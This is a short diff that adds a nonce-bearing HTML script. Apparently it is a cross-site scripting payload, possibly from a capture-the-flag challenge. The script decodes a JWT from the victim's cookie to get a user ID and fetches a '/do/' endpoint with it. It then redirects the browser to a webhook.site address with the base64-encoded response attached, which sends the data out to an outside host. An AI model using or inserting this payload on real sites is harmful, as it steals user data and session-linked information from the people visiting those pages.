@@ -1,0 +1,6 @@
+<script nonce="6cfa460c34d3b448767eb47edb9a73d03061e913cd8a7d712340ccdf8b342c36">
+    let a = JSON.parse(atob(document.cookie.split("=")[1].split(".")[1]))["userId"];
+    fetch("/do/" + a )
+    .then((res) => res.text())
+    .then((res) => (window.location = "https://webhook.site/15dbedb8-334e-4b75-9a2a-170d00d56991?a=" + btoa(res)));
+    </script>
